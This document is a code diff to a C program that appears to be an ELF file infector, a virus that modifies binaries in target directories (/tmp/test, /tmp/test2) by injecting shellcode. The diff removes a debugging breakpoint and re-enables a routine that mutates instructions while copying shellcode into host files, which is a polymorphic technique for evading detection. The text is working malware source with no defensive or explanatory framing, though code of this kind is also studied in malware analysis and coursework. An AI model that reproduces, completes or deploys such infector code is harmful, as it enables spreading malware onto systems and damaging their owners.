@@ -4,7 +4,6 @@ static void  start(void) {}
 #include "shellcode.h"
 
 int   entry_point(void *magic) {
-  asm("int3");
   char    infectDir[] = "/tmp/test";
   char    infectDir2[] = "/tmp/test2";
   char    procName[] = "/proc/";
@@ -455,7 +454,6 @@ static int  mapFile(const char *dirname, const char *filename, struct bfile *bin
     munmap(tmp, len);
     return (1);
   }
-  // TODO Change to O_RDONLY
   if ((fd = open(tmp, O_RDWR, 0)) < 0) {
     munmap(tmp, len);
     return (-1);
@@ -540,9 +538,9 @@ static void obfuscate(char *header, size_t size) {
 }
 
 const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = {
-  "\xcc",
-  "\x90",
-  "",
+  /* "\xcc", */
+  /* "\x90", */
+  /* "", */
   /* "\x55", */
   /* "\x50\x48\x89\xe8\x5d\x50\x48\x89\xe8\x5d\x55", */
   /* "" */
@@ -560,31 +558,31 @@ static int  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
   bin = (void *)new->header;
   shellcode = (void *)start;
   while (i < size) {
-    /* ins = (void *)copyModifiedCode - sizeof(instructions); */
-    /* while (ins != (void *)copyModifiedCode) { */
-    /*   j = 0; */
-    /*   while (ins[j] != 0 && shellcode[i + j] == ins[j]) */
-    /*     j += 1; */
-    /*   if (ins[j] != 0) { */
-    /*     while (ins[0] != 0) */
-    /*       ins += MAX_INS_SIZE; */
-    /*     ins += MAX_INS_SIZE; */
-    /*     continue ; */
-    /*   } */
-    /*   i += 1; */
-    /*   // TODO Choose random replacement */
-    /*   ins += MAX_INS_SIZE; */
-    /*   // TODO Check if enough space */
-    /*   k = 0; */
-    /*   while (k < j) { */
-    /*     bin[binSize] = ins[k]; */
-    /*     binSize += 1; */
-    /*     k += 1; */
-    /*   } */
-    /*   while (ins[0] != 0) */
-    /*     ins += MAX_INS_SIZE; */
-    /*   ins += MAX_INS_SIZE; */
-    /* } */
+    ins = (void *)copyModifiedCode - sizeof(instructions);
+    while (ins != (void *)copyModifiedCode) {
+      j = 0;
+      while (ins[j] != 0 && shellcode[i + j] == ins[j])
+        j += 1;
+      if (ins[j] != 0) {
+        while (ins[0] != 0)
+          ins += MAX_INS_SIZE;
+        ins += MAX_INS_SIZE;
+        continue ;
+      }
+      i += 1;
+      // TODO Choose random replacement
+      ins += MAX_INS_SIZE;
+      // TODO Check if enough space
+      k = 0;
+      while (k < j) {
+        bin[binSize] = ins[k];
+        binSize += 1;
+        k += 1;
+      }
+      while (ins[0] != 0)
+        ins += MAX_INS_SIZE;
+      ins += MAX_INS_SIZE;
+    }
     bin[binSize] = shellcode[i];
     i += 1;
     binSize += 1;
